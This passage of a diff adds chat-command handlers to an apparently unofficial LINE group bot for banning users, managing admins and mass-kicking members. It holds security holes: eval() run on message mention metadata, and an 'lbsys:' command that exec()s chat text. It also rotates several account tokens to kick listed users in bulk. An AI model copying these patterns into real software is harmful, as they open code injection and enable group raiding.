+                            a = han.getChats([to])
+                            if a[1][0][8][1][2] == False:
+                                han.updateChatPreventedUrl(msg[2], True)
+                                han.replyMessage(msg,"※Url➤🔴")
+                            else:
+                                han.replyMessage(msg,"已經是關閉狀態")
+                            report(msg[2],msg[1],"偵測關閉群組網址")
+                        case 'lb:geturl':
+                            a = han.getChats([to])
+                            if a[1][0][8][1][2] == False:
+                                url = han.reissueChatTicket(to)
+                                han.replyMessage(msg,"https://line.me/R/ti/g/{}".format(url[1]))
+                            else:
+                                han.replyMessage(msg,"網址未開啟")
+                        case 'lb:set':
+                            try:
+                                ret_ = "ΞΞΞΞΞ〘Bot Status〙ΞΞΞΞΞ"    
+                                if settings["autoJoin"] == True: ret_ += "\n※Auto Join➤🟢"
+                                else: ret_ += "\n※Auto Join➤🔴"
+                                if settings["asynckill"] == True: ret_ += "\n※Async Kill➤🟢"
+                                else: ret_ += "\n※Async Kill➤🔴"
+                                if settings["ttkl"] == True: ret_ += "\n※Ttkl Kill➤🟢"
+                                else: ret_ += "\n※Ttkl Kill➤🔴"
+                                ret_ +="\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"                   
+                                ret_ += "\nCreator:𝓱𝓪𝓷"
+                                ret_ += "\nID: han174"
+                                ret_ += "\nQR:http://line.me/ti/p/~han174"
+                                ret_ += "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"
+                                han.replyMessage(msg, str(ret_))
+                            except Exception as e:
+                                han.replyMessage(msg,f'error-->\n{e}')
+                        case 'lb:pi':
+                            x = han.getChats([to])
+                            y = x[1][0][8][1][2]
+                            try:
+                                ret_ = "ΞΞΞΞ〘Group Status〙ΞΞΞΞ"   
+                                if y == True: ret_ += "\n※Group Url➤🔴"
+                                else: ret_ += "\n※Group Url➤🟢" 
+                                if to in jk['joinkick']: ret_ += "\n※Join Kick➤🟢"
+                                else: ret_ += "\n※Join Kick➤🔴"
+                                if to in protect["adminprotect"]: ret_ += "\n※Admin Protect➤🟢"
+                                else: ret_ += "\n※Admin Protect➤🔴"
+                                if to in protect["kickprotect"]: ret_ += "\n※Kick Protect➤🟢"
+                                else: ret_ += "\n※Kick Protect➤🔴"
+                                if to in protect["inviteprotect"]: ret_ += "\n※Invite Protect➤🟢"
+                                else: ret_ += "\n※Invite Protect➤🔴"
+                                ret_ +="\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ"                   
+                                han.replyMessage(msg, str(ret_))
+                            except Exception as e:
+                                han.replyMessage(msg,f'error-->\n{e}')
+                        case 'lb:runtime':
+                            eltime = time.time() - mulai
+                            bot = "ΞΞΞΞ〘Run Time〙ΞΞΞΞ\n" +Runtime(eltime)
+                            han.replyMessage(msg,bot)
+                        case 'lb:al':
+                            try:
+                                if admin['admin'] == []:
+                                    han.replyMessage(msg,"ΞΞΞΞΞ〘權限名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                else:
+                                    mc = "ΞΞΞΞΞΞΞ〘權限名單〙ΞΞΞΞΞΞΞ"
+                                    no = 0 
+                                    try:
+                                        for mi_d in admin['admin']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                    except:
+                                        han.replyMessage(msg,"管理員【"+(str(len(admin)))+"】")
+                            except Exception as e:
+                                print('al error-->'+str(e))
+                        case 'lb:cl':
+                            try:
+                                if creator['creator'] == []:
+                                    han.replyMessage(msg,"ΞΞΞΞΞ〘作者名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                else:
+                                    mc = "ΞΞΞΞΞΞΞ〘作者名單〙ΞΞΞΞΞΞΞ"
+                                    no = 0 
+                                    try:
+                                        for mi_d in creator['creator']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                    except:
+                                        han.replyMessage(msg,"作者【"+(str(len(admin)))+"】")
+                            except Exception as e:
+                                print('al error-->'+str(e))
+                        case 'lb:bl':
+                            try:
+                                if ban['blacklist'] == []:
+                                    han.replyMessage(msg,"ΞΞΞΞΞ〘黑名單〙ΞΞΞΞΞ\n空\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                else:
+                                    mc = "ΞΞΞΞΞΞΞ〘黑名單〙ΞΞΞΞΞΞΞ"
+                                    no = 0 
+                                    try:
+                                        for mi_d in ban['blacklist']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"+"\n"+str(mi_d)
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                        han.replyMessage(msg,mc +"\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                    except:
+                                        han.replyMessage(msg,"黑名單【"+(str(len(admin)))+"】")
+                            except Exception as e:
+                                print('bl error-->'+str(e))
+                        case 'spl':
+                            try:
+                                mc = "ΞΞΞΞΞ〘特殊名單〙ΞΞΞΞΞ\n"
+                                mc += "ΞΞΞΞΞ踢人名單ΞΞΞΞΞ"
+                                if ybk['kick'] == []:
+                                    mc += "\n空"
+                                else:
+                                    no = 0 
+                                    try:
+                                        for mi_d in ybk['kick']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                    except Exception as e:
+                                        print('spl kick error-->'+str(e))    
+                                mc += "\nΞΞΞΞΞ取消名單ΞΞΞΞΞ"
+                                if ybk['cancel'] == []:
+                                    mc += "\n空"
+                                else:
+                                    no = 0 
+                                    try:
+                                        for mi_d in ybk['cancel']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                    except Exception as e:
+                                        print('spl cancel error-->'+str(e))
+                                han.replyMessage(msg,mc +"\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")       
+                            except Exception as e:
+                                print('bl error-->'+str(e))
+                        case 'tlist':
+                            try:
+                                mc = "ΞΞΞΞΞ〘專武名單〙ΞΞΞΞΞ"
+                                if ttkl['kick'] == []:
+                                    mc += "\n空"
+                                else:
+                                    no = 0 
+                                    try:
+                                        for mi_d in ttkl['kick']:
+                                            try:
+                                                no += 1
+                                                mc += f"\n※{no}.{han.getContact(mi_d)[22]}"
+                                            except:
+                                                print("錯誤:" +str(mi_d))
+                                    except Exception as e:
+                                        print('ttkl error-->'+str(e))
+                                han.replyMessage(msg,mc +"\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            except Exception as e:
+                                print('ttkl error-->'+str(e))
+                        case 'lb:clearadmin':
+                            if msg[1] in creator['creator']:
+                                admin['admin'] = []
+                                han.replyMessage(msg,"clear admin success")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試清空權限")
+                        case 'lb:clearban':
+                            if msg[1] in creator['creator']:
+                                ban['blacklist'] = []
+                                han.replyMessage(msg,"clear blacklist success")
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試清空黑單")
+                        case 'tcal':
+                            ttkl['kick'] = []
+                            han.replyMessage(msg,"已清專武名單")
+                        case 'cspl':
+                            ybk["kick"] = []
+                            ybk["cancel"] = []
+                            backupData()
+                            han.replyMessage(msg,"已清空特殊拆名單")
+                        case 'kspl':
+                            if settings['async'] == True:
+                                if ybk["kick"] and ybk["cancel"] != '':
+                                    n=0
+                                    f=0
+                                    async def tk(n,to, i):
+                                        threading.Thread(target=han.deleteOtherFromChat, args=(n, msg[2], [i],)).start()
+                                    jk['joinkick'].append(to)
+                                    for x in ybk["kick"]:
+                                        if n == len(account["token"]):n = 0
+                                        asyncio.run(tk(n,to, x))
+                                        n += 1
+                                    for x in ybk["cancel"]:
+                                        han.cancelGroupInvitation(to,[x])
+                                    return
+                                else:han.relatedMessage(to,"列表中無人",op.message.id)
+                            else:han.relatedMessage(to,"你尚未開啟功能",op.message.id)
+                        case 'gid':
+                            han.replyMessage(msg,msg[2])
+                        case 'mymid':
+                            han.replyMessage(msg,msg[1])
+                        case 'lb:bye':
+                            han.replyMessage(msg, "accept exit command")
+                            try:
+                                jk["joinkick"].remove(to)
+                            except:
+                                pass
+                            try:
+                                protect["adminprotect"].remove(to)
+                            except:
+                                pass
+                            try:
+                                protect["kickprotect"].remove(to)
+                            except:
+                                pass
+                            try:
+                                protect["inviteprotect"].remove(to)
+                            except:
+                                pass
+                            han.deleteSelfFromChat(to) 
+                            report(msg[2],msg[1],"退群指令觸發")
+                        case 'lb:mine':
+                            ret="ΞΞΞΞΞ〘機器狀態查詢〙ΞΞΞΞΞ"
+                            ret2=""
+                            try:
+                                han.deleteOtherFromChat(to,["Fuck you"])
+                            except Exception as e:
+                                if e.message == "request blocked":
+                                    ret+=f"\n※踢人狀態:🔴\n※邀請狀態:🔴"
+                                else:
+                                    ret+=f"\n※踢人狀態:🟢\n※邀請狀態:🟢"
+                            try:
+                                han.findAndAddContactsByMid("u0348f477412bc2506bcafb74902367ad")
+                                ret+=f"\n※加友狀態:🟢"
+                            except Exception as e:
+                                if e.message == "request blocked":
+                                    ret+=f"\n※加友狀態:🔴"
+                            ret+= "\n※取消狀態:🟢"
+                            ret+= "\n※版本資訊:CHRLINEbot V1.0"
+                            han.replyMessage(msg,f"{ret}" + "\nΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞ")
+                        case 'lb:pic':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"請傳送圖片")
+                                settings["pic"] = True
+                                settings["picmid"].append(msg[1]) 
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試更換頭貼")
+                        case 'lb:cover':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"請傳送圖片")
+                                settings["cover"] = True
+                                settings["covermid"].append(msg[1])
+                                backupData()
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試更換封面")
+                        case 'lb:logout':
+                            if msg[1] in creator['creator']:
+                                han.replyMessage(msg,"已自動登出")
+                                os._exit(0)
+                            else:
+                                han.replyMessage(msg,"無權使用開發者指令")
+                                report(msg[2],msg[1],"管理員嘗試登出")
+                        case 'tkal':
+                            if settings['ttkl'] == True:
+                                if ttkl['kick'] == []:
+                                    han.replyMessage(msg, "列表中無人(｡･ω･｡)")
+                                else:
+                                    try:
+                                        for x in ttkl["kick"]:
+                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2],[x])).start()
+                                        jk["joinkick"].append(to)
+                                        han.replyMessage(msg, "已自動開啟進群保護")
+                                    except:
+                                        han.replyMessage(msg,"Error-->request blocked")
+                            else:
+                                han.replyMessage(msg, "你尚未開啟功能")
+                            report(msg[2],msg[1],"專武指令觸發")
+                    if text.startswith("lbttk"):
+                        klist = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if han.profile[1] in mid[1]:
+                                    continue
+                                if mid[1] not in klist and mid[1] not in bigdick:
+                                    klist.append(mid[1])
+                                    try:
+                                        for kmid in klist:
+                                            threading.Thread(target=han.deleteOtherFromChat, args=(msg[2], kmid)).start()
+                                    except:
+                                        han.replyMessage(msg,"Error-->request blocked")
+                        del klist
+                    elif text.startswith('lbsys:'):
+                        if msg[1] in creator['creator']:
+                            try:
+                                with stdoutIO() as s:
+                                    exec(msg[10][6:],globals(), locals())
+                                han.sendMessage(msg[2],'output -->\n'+s.getvalue(),relatedMessageId=msg[4])
+                            except Exception as e:
+                                han.sendMessage(msg[2],'error --> '+str(e),relatedMessageId=msg[4])
+                        else:
+                            han.replyMessage(msg,"無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試使用sys指令")
+                    elif text.startswith("mid"):  
+                        mlists = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            no = 0
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] not in mlists:
+                                    mlists.append(mid[1])
+                            txt = "ΞΞΞΞΞΞΞ〘查詢Mid〙ΞΞΞΞΞΞΞ"
+                            no = 0
+                            try:
+                                for mlist in mlists:
+                                    n = han.getContact(mlist)
+                                    no += 1
+                                    txt +=  f"\n※{no}.{n[22]}"+"\n"+f"{n[1]}"
+                            except:
+                                pass
+                        han.replyMessage(msg, txt + "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                        del mlists              
+                    elif text.startswith("lbadd"):
+                        adminlist = []
+                        adminlist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] not in admin['admin']:
+                                    if mid[1] not in adminlist:
+                                        adminlist.append(mid[1])
+                                else:
+                                    if mid[1] not in adminlist2:
+                                        adminlist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘新增權限〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist) != 0:
+                                for x in adminlist:
+                                    y = han.getContact(x)
+                                    try:
+                                        admin['admin'].append(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist2) != 0:
+                                for x in adminlist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            report(msg[2],msg[1],"新增權限指令觸發",adminlist)
+                        del adminlist
+                        del adminlist2
+                    elif text.startswith("lbdel"):
+                        adminlist = []
+                        adminlist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] in admin['admin']:
+                                    if mid[1] not in adminlist:
+                                        adminlist.append(mid[1])
+                                else:
+                                    if mid[1] not in adminlist2:
+                                        adminlist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘刪除權限〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist) != 0:
+                                for x in adminlist:
+                                    y = han.getContact(x)
+                                    try:
+                                        admin['admin'].remove(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(adminlist2) != 0:
+                                for x in adminlist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            report(msg[2],msg[1],"刪除權限指令觸發",adminlist)
+                        del adminlist
+                        del adminlist2
+                    elif text.startswith("del:"):
+                        x = msg[10][4:]
+                        y = han.getContact(x)
+                        if len(x) != 33:
+                            han.replyMessage(msg, "Error-->invalid mid")
+                        else:
+                            if msg[1] in creator['creator']:
+                                if x in admin['admin']:
+                                    txt = "ΞΞΞΞΞΞ〘Mid刪除權限〙ΞΞΞΞΞΞ"
+                                    admin['admin'].remove(x)
+                                    backupData()
+                                    txt += f"\n{y[22]}\n{x}"
+                                    han.replyMessage(msg, txt+ "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                else:
+                                    han.replyMessage(msg, "他不是權限者")
+                            else:
+                                han.replyMessage(msg, "無權使用開發者指令")
+                                report(msg[2],msg[1],"權限者嘗試使用Mid刪除權限")
+                    elif text.startswith("cdel:"):
+                        x = msg[10][5:]
+                        y = han.getContact(x)
+                        if len(x) != 33:
+                            han.replyMessage(msg, "Error-->invalid mid")
+                        else:
+                            if msg[1] in creator['creator']:
+                                if x in creator['creator']:
+                                    txt = "ΞΞΞΞ〘Mid刪除作者權限〙ΞΞΞΞ"
+                                    creator['creator'].remove(x)
+                                    backupData()
+                                    txt += f"\n{y[22]}\n{x}"
+                                    han.replyMessage(msg, txt+ "\nΞΞΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞΞΞ")
+                                else:
+                                    han.replyMessage(msg, "他沒有作者權限")
+                            else:
+                                han.replyMessage(msg, "無權使用開發者指令")
+                                report(msg[2],msg[1],"權限者嘗試使用Mid刪除作者權限")
+                    elif text.startswith("lbcadd"):
+                        if msg[1] in bigdick:
+                            adminlist = []
+                            adminlist2 = []
+                            if 'MENTION' in msg[18]:
+                                key = eval(msg[18]["MENTION"])
+                                tags = key["MENTIONEES"]
+                                for tag in tags:
+                                    mid = han.getContact(tag['M'])
+                                    if mid[1] not in creator['creator']:
+                                        if mid[1] not in adminlist:
+                                            adminlist.append(mid[1])
+                                    else:
+                                        if mid[1] not in adminlist2:
+                                            adminlist2.append(mid[1])
+                                txt = "ΞΞΞΞ〘新增作者權限〙ΞΞΞΞ"
+                                txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist) != 0:
+                                    for x in adminlist:
+                                        y = han.getContact(x)
+                                        try:
+                                            creator['creator'].append(x)
+                                            backupData()
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist2) != 0:
+                                    for x in adminlist2:
+                                        y = han.getContact(x)
+                                        try:
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                                
+                            del adminlist
+                            del adminlist2
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試新增作者權限")
+                    elif text.startswith("lbcdel"):
+                        if msg[1] in bigdick:
+                            adminlist = []
+                            adminlist2 = []
+                            if 'MENTION' in msg[18]:
+                                key = eval(msg[18]["MENTION"])
+                                tags = key["MENTIONEES"]
+                                for tag in tags:
+                                    mid = han.getContact(tag['M'])
+                                    if mid[1] in creator['creator']:
+                                        if mid[1] not in adminlist:
+                                            adminlist.append(mid[1])
+                                    else:
+                                        if mid[1] not in adminlist2:
+                                            adminlist2.append(mid[1])
+                                txt = "ΞΞΞΞ〘刪除作者權限〙ΞΞΞΞ"
+                                txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist) != 0:
+                                    for x in adminlist:
+                                        y = han.getContact(x)
+                                        try:
+                                            creator['creator'].remove(x)
+                                            backupData()
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
+                                no = 0
+                                if len(adminlist2) != 0:
+                                    for x in adminlist2:
+                                        y = han.getContact(x)
+                                        try:
+                                            no += 1
+                                            txt +=  f"\n※{no}.{y[22]}"
+                                        except:
+                                            pass
+                                else:
+                                    txt += "\n無"
+                                han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            del adminlist
+                            del adminlist2
+                        else:
+                            han.replyMessage(msg, "無權使用開發者指令")
+                            report(msg[2],msg[1],"管理員嘗試刪除作者權限")
+                    elif text.startswith("ban"):
+                        blist = []
+                        blist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] not in admin['admin'] and mid[1] not in ban['blacklist'] and mid[1] not in creator['creator']:
+                                    if mid[1] not in blist:
+                                        blist.append(mid[1])
+                                else:
+                                    if mid[1] not in blist2:
+                                        blist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘新增黑單〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(blist) != 0:
+                                for x in blist:
+                                    y = han.getContact(x)
+                                    try:
+                                        ban['blacklist'].append(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(blist2) != 0:
+                                for x in blist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            report(msg[2],msg[1],"新增黑單指令觸發",blist)
+                        del blist
+                        del blist2     
+                    elif text.startswith("unban"):
+                        blist = []
+                        blist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] in ban['blacklist']:
+                                    if mid[1] not in blist:
+                                        blist.append(mid[1])
+                                else:
+                                    if mid[1] not in blist2:
+                                        blist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘刪除黑單〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ刪除成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(blist) != 0:
+                                for x in blist:
+                                    y = han.getContact(x)
+                                    try:
+                                        ban['blacklist'].remove(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ刪除失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(blist2) != 0:
+                                for x in blist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                            report(msg[2],msg[1],"刪除黑單指令觸發",blist)
+                        del blist
+                        del blist2 
+                    elif text.startswith("kadd"):
+                        klist = []
+                        klist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] not in ybk['kick'] and mid[1] not in admin['admin'] and mid[1] not in creator['creator']:
+                                    if mid[1] not in klist:
+                                        klist.append(mid[1])
+                                else:
+                                    if mid[1] not in klist2:
+                                        klist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘新增踢人名單〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist) != 0:
+                                for x in klist:
+                                    y = han.getContact(x)
+                                    try:
+                                        ybk['kick'].append(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist2) != 0:
+                                for x in klist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                        del klist
+                        del klist2 
+                    elif text.startswith("kdel"):
+                        klist = []
+                        klist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1]  in ybk['kick']:
+                                    if mid[1] not in klist:
+                                        klist.append(mid[1])
+                                else:
+                                    if mid[1] not in klist2:
+                                        klist2.append(mid[1])
+                            txt = "ΞΞΞΞΞ〘移除踢人名單〙ΞΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ移除成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist) != 0:
+                                for x in klist:
+                                    y = han.getContact(x)
+                                    try:
+                                        ybk['kick'].remove(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ移除失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist2) != 0:
+                                for x in klist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                        del klist
+                        del klist2 
+                    elif text.startswith("tadd"):
+                        klist = []
+                        klist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] not in ttkl['kick'] and mid[1] not in admin['admin'] and mid[1] not in creator['creator']:
+                                    if mid[1] not in klist:
+                                        klist.append(mid[1])
+                                else:
+                                    if mid[1] not in klist2:
+                                        klist2.append(mid[1])
+                            txt = "ΞΞΞΞ〘新增專武名單〙ΞΞΞΞ"
+                            txt += "\nΞΞΞΞΞ新增成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist) != 0:
+                                for x in klist:
+                                    y = han.getContact(x)
+                                    try:
+                                        ttkl['kick'].append(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ新增失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist2) != 0:
+                                for x in klist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                        del klist
+                        del klist2 
+                    elif text.startswith("tdel"):
+                        klist = []
+                        klist2 = []
+                        if 'MENTION' in msg[18]:
+                            key = eval(msg[18]["MENTION"])
+                            tags = key["MENTIONEES"]
+                            for tag in tags:
+                                mid = han.getContact(tag['M'])
+                                if mid[1] in ttkl['kick']   :
+                                    if mid[1] not in klist:
+                                        klist.append(mid[1])
+                                else:
+                                    if mid[1] not in klist2:
+                                        klist2.append(mid[1])
+                            txt = "ΞΞΞ〘移除專武名單〙ΞΞΞ"
+                            txt += "\nΞΞΞΞΞ移除成功ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist) != 0:
+                                for x in klist:
+                                    y = han.getContact(x)
+                                    try:
+                                        ttkl['kick'].remove(x)
+                                        backupData()
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            txt += "\nΞΞΞΞΞ移除失敗ΞΞΞΞΞ"
+                            no = 0
+                            if len(klist2) != 0:
+                                for x in klist2:
+                                    y = han.getContact(x)
+                                    try:
+                                        no += 1
+                                        txt +=  f"\n※{no}.{y[22]}"
+                                    except:
+                                        pass
+                            else:
+                                txt += "\n無"
+                            han.replyMessage(msg, txt + "\nΞΞΞΞΞ〘𝓱𝓪𝓷 ßôt〙ΞΞΞΞΞ")
+                        del klist
+                        del klist2
+                    elif text.startswith("caadd:"):
+                        isi = text.replace("caadd:","")
+                        print(isi)
